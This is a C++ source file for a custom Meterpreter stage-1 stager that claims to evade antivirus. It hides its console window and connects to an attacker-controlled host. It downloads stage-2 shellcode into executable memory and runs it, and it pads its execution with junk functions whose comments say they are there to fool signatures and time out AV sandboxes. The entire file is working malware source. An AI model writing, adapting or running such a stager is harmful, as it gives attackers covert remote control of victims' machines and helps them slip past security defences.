// Meterp-stage1.cpp :custom meterpreter stage 1 source code bypass AV.
// Author: Nathaniel Hirsch <nathaniel.hirsch@gmail.com>

#include "stdafx.h"

//garbage string creation function to fool av doubles every char in string
char* make_string1(char* s)
{ 
	char *result = (char *) malloc(strlen(s) * 2 + 1); 
	unsigned int i; 
	for (i = 0; i < strlen(s) * 2 + 1; i++)
	{ 
		result[i] = s[i / 2]; 
		result[i + 1] = s[i / 2]; 
	} 
	result[i] = '\0'; 
	return result; 
}

//pow mod function  result = a ^ b mode c
long powmod(long a, long b, long c){
	long result = 1;
	long base = a;

	while (b){
		if (b & 1){
			result = result*base % c;
		}
		b >>= 1;
		base = base*base % c;
	}
	return result;
}

//garbage string creation function to fool av reverse string
char* make_string2(const char *t) 
{ 
	int length = strlen(t); 
	int i; 
	char* t2 = (char*)malloc((length + 1) * sizeof(char)); 
	for (i = 0; i<length; i++) 
	{ 
		t2[(length - 1) - i] = t[i]; 
	} 
	t2[length] = '\0'; 
	return t2; 
}

//garbage string creation function XOR string with A
char* make_string3(char *s)
{
	char *result = (char *)malloc(strlen(s));
	unsigned int i;
	char key = 'A';
	for (i = 0; i < strlen(s); i++)
	{
		result[i] = s[i] ^ key;
	}
	result[i] = '\0';
	return result;
}

//set up the socket
void startsock() 
{ 
	WORD version = MAKEWORD(2, 2); 
	WSADATA data; 
	if (WSAStartup(version, &data) < 0) 
	{ 
		WSACleanup(); 
		exit(1); 
	} 
}

//garbage function to spin out time
void killit(int maxnum)
{
	int randnum = maxnum + 500;

	while (randnum > maxnum)
		randnum = rand() % 5000;

	return;
}

//garbage string creation function to fool av
char* scratch_fill1()
{ 
	char *scratch = make_string1("This.function.is.certified.safe."); 
	scratch = strstr(scratch, ".");
	return scratch; 
}

//fail clean on error
void sockerror(SOCKET sock) 
{ 
	closesocket(sock); 
	WSACleanup(); 
	exit(1); 
}

//garbage string creation function to fool av
char* scratch_fill2()
{ 
	char scratch1[200];
	char scratch2[100]; 
	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	for (int i = 0; i < 100; ++i)
	{
		scratch1[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
		scratch2[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	scratch1[99] = '\0';
	scratch2[99] = '\0';
	
	return make_string2(strcat(scratch1, scratch2));
}

//get the stage 2 shellcode
int getit(SOCKET sock, char * stage1, int stage0)
{ 
	int size = 0; 
	int recieved = 0; 
	char * startb = stage1; 
	while (recieved < stage0) 
	{ 
		size = recv(sock, (char *)startb, stage0 - recieved, 0); 
		startb += size; 
		recieved += size; 
		if (size == SOCKET_ERROR) 
			sockerror(sock); 
	}

	return recieved; 
}

//garbage string creation function to fool av
char* scratch_fill3()
{ 
	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char scratch[100];
	for (int i = 0; i < 100; ++i)
	{
		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	scratch[99] = '\0';
	char *scratch2 = strupr(scratch); 
	return strlwr(scratch2); 
}

//garbage string creation function to fool av
char* scratch_fill4()
{
	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char scratch[100];
	char *scratch2;
	for (int i = 0; i < 100; ++i) 
	{
		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	scratch[99] = '\0';
	scratch2 = make_string3(scratch);
	scratch2[99] = '\0';
	return scratch2;
}

//garbage string creation function to fool av
char* scratch_fill5()
{
	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char scratch[100];
	for (int i = 0; i < 100; ++i)
	{
		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	scratch[99] = '\0';
	return scratch;
}

//for quick sort
int partition(int a[], int l, int r) {
	int pivot, i, j, t;
	pivot = a[l];
	i = l; j = r + 1;

	while (1)
	{
		do ++i; while (a[i] <= pivot && i <= r);
		do --j; while (a[j] > pivot);
		if (i >= j) break;
		t = a[i]; a[i] = a[j]; a[j] = t;
	}
	t = a[l]; a[l] = a[j]; a[j] = t;
	return j;
}

//quick sort
void quickSort(int a[], int l, int r)
{
	int j;

	if (l < r)
	{
		// divide and conquer
		j = partition(a, l, r);
		quickSort(a, l, j - 1);
		quickSort(a, j + 1, r);
	}

}

//garbage int generation function
void rand_num()
{
	int num[SCRATCH_SIZE];
	int i;

	for (i = 0; i < SCRATCH_SIZE; ++i)
	{
		num[i] = rand() % MAXINT32;
	}
	quickSort(num, 0, SCRATCH_SIZE);
}

//garbage random function.
void rand_fun()
{
	static const char alphanum[] = "0123456789";
	char scratch[10];
	int num;
	int i;
	for (i = 0; i < 10; ++i)
	{
		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	scratch[i] = '\0';
}

//make the connection to addr on port
SOCKET connect(char * addr, int port)
{ 
	struct hostent * ipaddr; 
	struct sockaddr_in sockin; 
	SOCKET sock; 
	sock = socket(AF_INET, SOCK_STREAM, 0); 
	if (sock == INVALID_SOCKET) 
		sockerror(sock); 

	ipaddr = gethostbyname(addr); 
	if (ipaddr == NULL) 
		sockerror(sock);

	memcpy(&sockin.sin_addr.s_addr, ipaddr->h_addr, ipaddr->h_length); 
	sockin.sin_family = AF_INET; 
	sockin.sin_port = htons(port); 
	if (connect(sock, (struct sockaddr *)&sockin, sizeof(sockin))) 
		sockerror(sock); 
	
	return sock; 
}

/* These are used for AV evasion, eating up AV sanbox time, modifying signature, etc*/
void rand_func()   
{
	int i,j;
	int run = rand() % 10 + 1;

	char * scratch[SCRATCH_SIZE];
	char temp[6000];

	for (i = 0; i < SCRATCH_SIZE; ++i)
		scratch[i] = (char *)malloc(rand() % 5000 + 1000 + _getpid() );

	switch (run)
	{
		case 1:
			for (i = 0; i < SCRATCH_SIZE; ++i)
				strcpy(scratch[i], scratch_fill1());
		
			for (i = 0; i<SCRATCH_SIZE; ++i)
				for (j = i + 1; j<SCRATCH_SIZE; ++j){
					if (strcmp(scratch[i], scratch[j])<0)
					{
						strcpy(temp, scratch[i]);
						strcpy(scratch[i], scratch[j]);
						strcpy(scratch[j], temp);
					}
				}
			break;

		case 2:
			for (i = 0; i < SCRATCH_SIZE; ++i)
				strcpy(scratch[i], scratch_fill2());
		
			for (i = 0; i<SCRATCH_SIZE; ++i)
				for (j = i + 1; j<SCRATCH_SIZE; ++j){
					if (strcmp(scratch[i], scratch[j])>0)
					{
						strcpy(temp, scratch[i]);
						strcpy(scratch[i], scratch[j]);
						strcpy(scratch[j], temp);
					}
				}
			break;

		case 3:
			for (i = 0; i < SCRATCH_SIZE; ++i)
				strcpy(scratch[i], scratch_fill3());

			for (i = 0; i<SCRATCH_SIZE; ++i)
				for (j = i + 1; j<SCRATCH_SIZE; ++j){
					if (strcmp(scratch[i], scratch[j])<0)
					{
						strcpy(temp, scratch[i]);
						strcpy(scratch[i], scratch[j]);
						strcpy(scratch[j], temp);
					}
				}
			break;

		case 4:
			for (i = 0; i < SCRATCH_SIZE; ++i)
				strcpy(scratch[i], scratch_fill4());

			for (i = 0; i<SCRATCH_SIZE; ++i)
				for (j = i + 1; j<SCRATCH_SIZE; ++j){
					if (strcmp(scratch[i], scratch[j])>0)
					{
						strcpy(temp, scratch[i]);
						strcpy(scratch[i], scratch[j]);
						strcpy(scratch[j], temp);
					}
				}
			break;

		case 5:	
			unsigned long a;
			for (i = 0; i < rand() % 1000 + 100; i++)
			{
				a = powmod(rand() % 1000, rand() % 1000, rand() % 1000);
			}
			i = 0;
			for (; a > 0; a--){
				i = i << 1;
			}
			break;
			
		case 6:
			for (i = 0; i < rand() % _getpid(); i++)
			{
				__noop;
			}
			break;
			
		case 7:
			for (i = 0; i < SCRATCH_SIZE; ++i)
				strcpy(scratch[i], scratch_fill5());
			break;

		case 8:
			rand_num();
			break;

		case 9:
			rand_fun();
			break;

		default:
			killit(rand() % 5000);
			break;
	}

	for (i = 0; i < SCRATCH_SIZE; ++i)
		free(scratch[i]);

}

int _tmain(int argc, _TCHAR* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	SOCKET sock;
	ULONG32 stage0;		//data received to create meterpreter stage 2
	char * stage1;		//stage 2 shellcode stored here
	void(*stage2)();	//function pointer to execute stage 2 shellcode
	
	srand((unsigned)time(NULL));

														killit(rand() % 5000 + 1000);  //run this first to timeout any AV sandbox.

	startsock();
														rand_func();
	if (argc != 3) {		//either edit stdafx.h to set LHOST:LPORT or call ./prog.exe host port
		sock = connect(LHOST, LPORT);
	} 	else {
		sock = connect((char *)argv[1], atoi((char *) argv[2]));
	}
														rand_func();
	int size = recv(sock, (char *)&stage0, 4, 0);
														rand_func();
	if (size != 4 || stage0 <= 0)
		sockerror(sock);
														rand_func();
	stage1 = (char *) VirtualAlloc(0, stage0 + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
														rand_func();
	if (stage1 == NULL)
		sockerror(sock);
														rand_func();
	stage1[0] = 0xBF;
														rand_func();
	memcpy(stage1 + 1, &sock, 4);
														rand_func();
	size = getit(sock, stage1 + 5, stage0);
														rand_func();
	stage2 = (void(*)())stage1;
														rand_func();
	stage2();
														rand_func();
	return 0;
}